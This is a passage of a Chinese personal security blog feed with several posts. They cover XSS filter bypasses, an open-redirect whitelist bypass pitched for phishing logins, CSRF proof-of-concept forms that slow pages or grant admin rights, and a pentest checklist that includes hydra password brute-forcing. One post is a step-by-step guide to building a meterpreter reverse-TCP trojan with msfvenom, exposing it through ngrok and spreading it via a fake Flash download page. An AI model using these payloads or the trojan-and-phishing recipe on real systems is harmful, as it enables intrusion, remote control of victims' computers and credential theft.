<h2 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h2><p><code>js</code>中，函数不仅可以这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(alert)(1);</span></pre></td></tr></table></figure>

<p>还可以这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(alert)(1);</span></pre></td></tr></table></figure>

<p>传参可以这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert(1);</span></pre></td></tr></table></figure>

<p>还可以这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert&#96;1&#96;;</span></pre></td></tr></table></figure>

<p>配合空格替代符效果会更好。</p>
<h2 id="embed解析导致的xss"><a href="#embed解析导致的xss" class="headerlink" title="embed解析导致的xss"></a><code>embed</code>解析导致的<code>xss</code></h2><p>这个解析的条件得在新浏览器才可以，但是很鸡肋，因为无法打<code>cookie</code>（因为这个不是目标网站的域），所以只能执行一些其他的<code>js</code>代码，如跳转，弹窗等，<code>xss payload</code>如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">'http://static.zybuluo.com/1kbfree/2o0dq6spzahj8z7yjg64akgp/xss1.pdf'</span>&gt;</span></span></pre></td></tr></table></figure>

<p>如果以后遇到的话会再次更新~</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Url跳转之白名单绕过以及奇特绕过聊天框思路</title>
    <url>/2019/12/18/Url%E8%B7%B3%E8%BD%AC%E4%B9%8B%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E5%A5%87%E7%89%B9%E7%BB%95%E8%BF%87%E8%81%8A%E5%A4%A9%E6%A1%86%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<p>感谢<code>adrian</code>师傅的教导和分享~</p>
<p>1、首先打开<a href="http://www.baidu.com，去搜索一下`freebuf`" target="_blank" rel="noopener">www.baidu.com，去搜索一下`freebuf`</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/9j6bufzozz1rjigw9a3fx9f0/image_1d1mf60kc80f1u6i19bqae48b9.png" alt="image_1d1mf60kc80f1u6i19bqae48b9.png-107.8kB"></p>
<p>然后获取的<code>url</code>是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.baidu.com&#x2F;link?url&#x3D;gKPMFwrhesnw9LtxPlYYEXvjsNQTIQNTYPNjhEpXM09s-h-DNR7CvNQVIdPwClc8&amp;wd&#x3D;&amp;eqid&#x3D;aeedb9cb000057ad000000065c44d9cc</span></pre></td></tr></table></figure>

<p>然后打开后会跳转到<code>freebuf</code>，那么现在去打开一个百度跳转处，如下链接是登录的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;passport.baidu.com&#x2F;v2&#x2F;?login&amp;u&#x3D;xxxx</span></pre></td></tr></table></figure>

<p>但是这里的严格过滤了<code>u</code>参数，必须是<code>www.baidu.com</code>的域名才可以，那么我们可以将其改为如下跳转链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxxx.baidu.com&#x2F;xxxx&#x2F;?login&amp;u&#x3D;https:&#x2F;&#x2F;www.baidu.com&#x2F;link?url&#x3D;cUrBa17wHYDW9l0kvo44Pcz0n8X1IaXtotJ21Cox__bxGtPN84hjXbqkSFahOiE-&amp;wd&#x3D;&amp;eqid&#x3D;b6e4a67800000155000000065c44d129</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/0fgzrfqbkdvireog55pee1p3/image_1d1mg40gc1t6mfcrp3412vbv4om.png" alt="image_1d1mg40gc1t6mfcrp3412vbv4om.png-757.3kB"></p>
<p>那么我们假设跳转的<code>url</code>是我的，然后我可以改为一打开就弹出密码错误等，然后界面和百度的登录界面一模一样，这样子就可以诱导用户，使其将账号密码发送至我们的服务器。</p>
<p>其实这里还有很多的，比如搜狗、谷歌、等这些搜索引擎，因为这是域名信任关系，虽然我是百度的，但是我可以跳到<code>freebuf</code>，然后去<code>url</code>跳转的地方将其放入，就可以成功的跳转~（这样子的比较鸡肋），但是有很多厂商会认为跳转到谷歌的域名、百度的域名、搜狗的域名是可信的，就将他们设置为白名单，然后我们可以利用这种办法去绕过，导致<code>url</code>跳转漏洞，还有就是比如<code>a</code>站存在<code>url</code>跳转漏洞（<a href="http://www.a.com/?u=跳转的链接），然后`b`信任`a`站，允许他跳转到`a`网站（http://www.b.com/?u=www.a.com），那么可以改为如下链接导致`b`站也存在`url`跳转" target="_blank" rel="noopener">http://www.a.com/?u=跳转的链接），然后`b`信任`a`站，允许他跳转到`a`网站（http://www.b.com/?u=www.a.com），那么可以改为如下链接导致`b`站也存在`url`跳转</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.b.com&#x2F;?&#x3D;www.a.com&#x2F;?u&#x3D;跳转的链接</span></pre></td></tr></table></figure>

<hr>
<p>这里的思路和<code>adrian</code>师傅的一个思路类似（非常感谢师傅的分享~），标题是《某聊天客户端锁功能，激活聊天窗口聊天》，思路如下</p>
<blockquote>
<p>此时聊天客户端是锁定的状态，然后入群链接是<a href="http://xxx.xxx.xxx/add_qun.php?qun=群号（假设），然后去访问这个链接" target="_blank" rel="noopener">http://xxx.xxx.xxx/add_qun.php?qun=群号（假设），然后去访问这个链接</a> 由于入群链接会进行判断该用户是否加入过该群，如果是已加入的群成员，则进入群窗口 因为这里没有严格的验证聊天客户端是否是锁定的状态 所以直接就略过了锁定的功能就打开聊天框可以聊天了，然后发送的信息也是可以发送出去的~ 就导致了无视锁功能的效果~</p>
</blockquote>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>页面垃圾混杂漏洞</title>
    <url>/2019/12/18/%E9%A1%B5%E9%9D%A2%E5%9E%83%E5%9C%BE%E6%B7%B7%E6%9D%82%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<blockquote>
<p>单纯好玩 没什么技术含量吧。</p>
</blockquote>
<p>有没有想过一个<code>js</code>代码，提取个人资料，然后放到<code>xxx</code>名人言等特效，那么如果这个时候页面会非常卡，如下面一段代码，单纯只是处理这些，就会很卡</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">""</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">id</span>=<span class="string">"test"</span> <span class="attr">value</span>=<span class="string">"xxxxxxxxxx..."</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="javascript"><span class="keyword">var</span> test = $(<span class="string">"#test"</span>).val();</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="javascript"><span class="built_in">document</span>.write( test );</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></pre></td></tr></table></figure>

<p>可以看看真实效果</p>
<p><a href="http://static.zybuluo.com/1kbfree/y2ijjssojzba3v2it4praucg/test2.html" target="_blank" rel="noopener">http://static.zybuluo.com/1kbfree/y2ijjssojzba3v2it4praucg/test2.html</a></p>
<p>打开非常慢</p>
<p><img src="http://static.zybuluo.com/1kbfree/pkwd7lttakenleucdkbnbmy9/image_1dchafo8dt2d9581k1fm2714e719.png" alt="image_1dchafo8dt2d9581k1fm2714e719.png-4.5kB"></p>
<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>1、发现修改个人资料处存在<code>csrf</code><br>2、对姓名没有字符限制<br>3、会对字符进行处理等，而且<code>js</code>代码非常多的特效之类的</p>
<p>1、在页面处构造<code>csrf poc</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://xxx/workspace/student/submitUserBasicInfoModify"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"headerImageUrl"</span> <span class="attr">value</span>=<span class="string">"&amp;#47;ssoLogin&amp;#47;redirectToLogout"</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"nickName"</span> <span class="attr">value</span>=<span class="string">"csrfcsrf.............(这里很多个csrf字符)"</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"province"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"city"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"district"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"babyName"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"babyBirthday"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"mobilephone"</span> <span class="attr">value</span>=<span class="string">"18888888888"</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"qq"</span> <span class="attr">value</span>=<span class="string">"123&amp;quot;123"</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"address"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"logoutAccountTag"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"previewHeaderImageUrl"</span> <span class="attr">value</span>=<span class="string">"&amp;#47;ssoLogin&amp;#47;redirectToLogout"</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></pre></td></tr></table></figure>

<p>2、然后打开后页面如图</p>
<p>非常的卡顿</p>
<p><img src="http://static.zybuluo.com/1kbfree/bgn5x0gcwj67xymsftf14a4t/image_1dchbuvdn1nab7dhp7g1qb1fvv22.png" alt="image_1dchbuvdn1nab7dhp7g1qb1fvv22.png-29.8kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/1hlslzclp8g1p4om2udygmyu/image_1dchnfqct5l6eju172uen9c932v.png" alt="image_1dchnfqct5l6eju172uen9c932v.png-386.3kB"></p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>1、加上验证码，正常的<code>csrf</code>防护<br>2、对每个字符进行长度限制  </p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
        <category>思路</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>msf+ngrok远控木马制作（并且配合flash钓鱼）</title>
    <url>/2019/12/14/msf-ngrok%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ol>
<li>一个外网服务器（这里用免费的ngrok）</li>
<li>Metasploit（生成木马）</li>
<li>Kali（映射端口）</li>
</ol>
<h2 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h2><h3 id="ngrok下载地址"><a href="#ngrok下载地址" class="headerlink" title="ngrok下载地址"></a>ngrok下载地址</h3><p><code>https://www.ngrok.cc/#down-client</code></p>
<h2 id="生成木马开始"><a href="#生成木马开始" class="headerlink" title="生成木马开始"></a>生成木马开始</h2><h3 id="1、在ngrok官网上注册一个用户然后登陆，选择一个免费-付费隧道，然后选择tcp协议"><a href="#1、在ngrok官网上注册一个用户然后登陆，选择一个免费-付费隧道，然后选择tcp协议" class="headerlink" title="1、在ngrok官网上注册一个用户然后登陆，选择一个免费/付费隧道，然后选择tcp协议"></a>1、在<code>ngrok</code>官网上注册一个用户然后登陆，选择一个免费/付费隧道，然后选择<code>tcp</code>协议</h3><p><img src="http://static.zybuluo.com/1kbfree/whh5b00gnths8qd212fec489/photo_2019-12-14_09-59-01.jpg" alt="photo_2019-12-14_09-59-01.jpg-54.8kB"></p>
<h3 id="2、然后打开sunny（在工具下载那里）"><a href="#2、然后打开sunny（在工具下载那里）" class="headerlink" title="2、然后打开sunny（在工具下载那里）"></a>2、然后打开<code>sunny</code>（在工具下载那里）</h3><p>在<code>kali</code>下输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;sunny clientid 隧道id</span></pre></td></tr></table></figure>

<p>然后是这样的</p>
<p><img src="http://static.zybuluo.com/1kbfree/8l0puof3ykd5rksbav4xj5oc/1.jpg" alt="1.jpg-35.5kB"></p>
<p>打马赛克部分是我的外网的监听服务器</p>
<h3 id="3、生成木马"><a href="#3、生成木马" class="headerlink" title="3、生成木马"></a>3、生成木马</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.241 LPORT&#x3D;6 -f exe -i 12 &gt; Fuck.exe</span></pre></td></tr></table></figure>

<ul>
<li><code>-p</code>：选择攻击的<code>payload</code></li>
<li><code>LHOST</code>：监听的本地<code>IP</code></li>
<li><code>LPORT</code>：监听的本地端口</li>
<li><code>-f</code>：表示为<code>exe</code>程序</li>
<li><code>-i</code>：重复编码<code>12</code>次(听说有助于免杀)</li>
</ul>
<p>然后就会生成一个<code>Fuck.exe</code>的文件</p>
<p><img src="http://static.zybuluo.com/1kbfree/l7wbnud7fu0jk9w3k0fvfi79/2.png" alt="2.png-11.1kB"></p>
<h3 id="4、使用msf监听"><a href="#4、使用msf监听" class="headerlink" title="4、使用msf监听"></a>4、使用<code>msf</code>监听</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span></pre></td></tr><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payloads windows&#x2F;meterpreter&#x2F;reverset_tcp</span></pre></td></tr><tr><td class="code"><pre><span class="line">payloads &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverset_tcp</span></pre></td></tr><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.31.241</span></pre></td></tr><tr><td class="code"><pre><span class="line">lhost &#x3D;&gt; 192.168.31.241</span></pre></td></tr><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 6</span></pre></td></tr><tr><td class="code"><pre><span class="line">lport &#x3D;&gt; 6</span></pre></td></tr><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/4jzeb10zs5dvwm7tyq1q0erm/3.png" alt="3.png-213.5kB"></p>
<p>然后在<code>window</code>下打开<code>Fuck.exe</code>后，<code>Kali</code>会返回如下界面（<code>meterpreter</code>）</p>
<p><img src="http://static.zybuluo.com/1kbfree/l73qxeegmlbx0kqalzw1b5fv/3.jpg" alt="3.jpg-110kB"></p>
<p>这个时候已经可以监控打开这个<code>exe</code>文件的电脑了。</p>
<h3 id="Flash钓鱼"><a href="#Flash钓鱼" class="headerlink" title="Flash钓鱼"></a><code>Flash</code>钓鱼</h3><p>钓鱼页面下载页：<br><code>https://github.com/r00tSe7en/Fake-flash.cn</code></p>
<p>打开<code>index.html</code>，修改如下为你木马的下载地址</p>
<p><img src="http://static.zybuluo.com/1kbfree/rys1lazpb9cwfpglvdh4j52b/2.jpg" alt="2.jpg-114.1kB"></p>
<p>然后打开页面点击就会跳转到<code>https://www.xxxxxxxxxxxxxx.cn/</code>。</p>
<p><img src="http://static.zybuluo.com/1kbfree/q5z6ufffomh8ch0zkg7x1ajd/4.png" alt="4.png-158.8kB"></p>
<p>利用条件可以如下：</p>
<ol>
<li><code>xss</code>打不到<code>cookie</code>的时候，可以填写跳转到这里。</li>
<li>收集信息到位，挖到一个<code>url</code>跳转，然后丢到他们内部群里。</li>
</ol>
<p>以上条件纯属虚构，如违法立删… …</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>远控</tag>
      </tags>
  </entry>
  <entry>
    <title>一次逻辑测试进入管理员权限</title>
    <url>/2019/12/07/%E4%B8%80%E6%AC%A1%E9%80%BB%E8%BE%91%E6%B5%8B%E8%AF%95%E8%BF%9B%E5%85%A5%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90/</url>
    <content><![CDATA[<blockquote>
<p>漏洞过程：</p>
</blockquote>
<ol>
<li>注册用户（这里很奇葩，网站把没引入<code>layer.js</code>来限制用户注册，然后用<code>burp</code>抓取然后往返回包里添加<code>http://res.layui.com/layui/release/layer/dist/layer.js?v=3111</code>即可）</li>
<li>注册登录后存在越权漏洞，原理如下<br>我是<code>id</code>为<code>2000</code>的用户，然后我在修改资料的时候存在越权漏洞，抓包修改<code>id</code>为<code>1</code>的账户也就是管理员的账户信息，然后程序就会自动认为我是管理员，然后给我赋值为管理员权限，如下是过程</li>
</ol>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>1、注册用户（这里是可以绕过的注册）</p>
<p>比如点击注册的时候是没反应的</p>
<p><img src="http://static.zybuluo.com/1kbfree/uovqjuijv7t6w7l1vrip0pjc/image.png" alt="image.png-87kB"></p>
<p>看<code>f12</code>测试，看出没有引入<code>layer</code>，然后我们去找到这个<code>js</code>链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;res.layui.com&#x2F;layui&#x2F;release&#x2F;layer&#x2F;dist&#x2F;layer.js?v&#x3D;3111</span></pre></td></tr></table></figure>

<p>然后抓返回包添加进去</p>
<p><img src="http://static.zybuluo.com/1kbfree/r51jjezvoq796k39ua46sbeo/image.png" alt="image.png-89.1kB"></p>
<p>注册成功后登陆进去，访问如下<code>poc</code>即可，这个<code>html</code>页面是修改<code>id</code>为<code>1</code>用户的性别为女性，即可达到管理员权限，原理解释过了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://不告诉你/system/user/profile/update"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"userId"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></pre></td></tr></table></figure>

<p>然后就变成管理员了 =。=</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
        <category>好文</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>我的渗透思路</title>
    <url>/2019/12/06/%E8%87%AA%E5%B7%B1%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="拿到目标站点-xxx-com"><a href="#拿到目标站点-xxx-com" class="headerlink" title="拿到目标站点 xxx.com"></a>拿到目标站点 xxx.com</h2><ol>
<li>收集子域名</li>
<li>爆破端口</li>
<li>查看cms找响应漏洞</li>
<li>收集whois，等相关信息，然后用工具生成对应字典</li>
<li>扫描目录</li>
<li>如用第五步获取了后台目录，如果可以爆破，字典源于第四步</li>
<li>查看是什么搭建的，他的插件是否有利用漏洞</li>
<li>查c段</li>
</ol>
<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><blockquote>
<p>懒出来的</p>
</blockquote>
<p>用<code>nmap</code>扫描<code>c段</code>，然后使用<code>hydra</code>来爆破一些端口弱口令，如<code>3306</code>、<code>3389</code>、<code>21</code>，总有那么一些会出来的，如果没有，每逢过节烧烧香。</p>
<h2 id="常用工具如下"><a href="#常用工具如下" class="headerlink" title="常用工具如下"></a>常用工具如下</h2><p>在线短信验证码接收1：<a href="https://yunduanxin.net" target="_blank" rel="noopener">https://yunduanxin.net</a><br>在线短信验证码接收2：<a href="https://becmd.com/" target="_blank" rel="noopener">https://becmd.com/</a><br>DNSLOG：<a href="http://dnslog.cn/" target="_blank" rel="noopener">http://dnslog.cn/</a><br>在线邮箱接收1：<a href="http://www.yopmail.com/zh/" target="_blank" rel="noopener">http://www.yopmail.com/zh/</a><br>在线邮箱接收2：<a href="http://mail.bccto.me/" target="_blank" rel="noopener">http://mail.bccto.me/</a><br>在线指纹识别1（云悉）：<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a><br>在线指纹识别2：<a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a><br>微步在线：<a href="https://www.threatbook.cn/" target="_blank" rel="noopener">https://www.threatbook.cn/</a><br>爱站：<a href="https://www.aizhan.com/" target="_blank" rel="noopener">https://www.aizhan.com/</a><br>站长工具：<a href="http://tool.chinaz.com/" target="_blank" rel="noopener">http://tool.chinaz.com/</a><br>在线编码/解码工具：<a href="http://tool.chinaz.com/Tools/urlencode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/Tools/urlencode.aspx</a><br>在线查找历史IP：<a href="https://toolbar.netcraft.com/site_report?url=http://www.baidu.com" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url=http://www.baidu.com</a><br>在线子域名爆破：<a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a><br>在线身份证生成器：<a href="https://www.tiebazhushou.com/" target="_blank" rel="noopener">https://www.tiebazhushou.com/</a><br>谷歌镜像：<a href="https://gugeji.com/" target="_blank" rel="noopener">https://gugeji.com/</a><br>XSS平台：<a href="https://xss.pt/" target="_blank" rel="noopener">https://xss.pt/</a><br>提权辅助工具：<a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">https://bugs.hacking8.com/tiquan/</a></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>19year</title>
    <url>/2019/12/06/19year/</url>
    <content><![CDATA[<p>其实今年很操蛋，自己很快乐，也很悲伤。</p>
<p>快乐源于疯，悲伤亦是。<br>我认识了很多朋友，做了很多疯狂的事，但是我逐渐放下了背上的重任、心中的理想…<br>我花费了半年多的时间，忘记了我一整年的学习成果，因为我都去玩了，而且玩的有点野，有点浪。<br>还好，路还长，人暂年轻，未亡，仍可学。<br>博客记录成长，监督成长。</p>
<p>分享一个自己的照片吧</p>
<p><img src="http://static.zybuluo.com/1kbfree/psrt60o2em67w7ydpvievkhn/image.png" alt="image.png-805.7kB"></p>
<p>以前的Blog：</p>
<blockquote>
<p><a href="https://only-free.github.io/" target="_blank" rel="noopener">https://only-free.github.io/</a></p>
</blockquote>
<p>我知道以前的好看，但是我懒得重新弄了，老了，顾不上外观了。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>感慨</tag>
      </tags>
  </entry>
  <entry>
    <title>厚学网任意用户密码重置</title>
    <url>/2019/10/26/%E5%8E%9A%E5%AD%A6%E7%BD%91%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/</url>
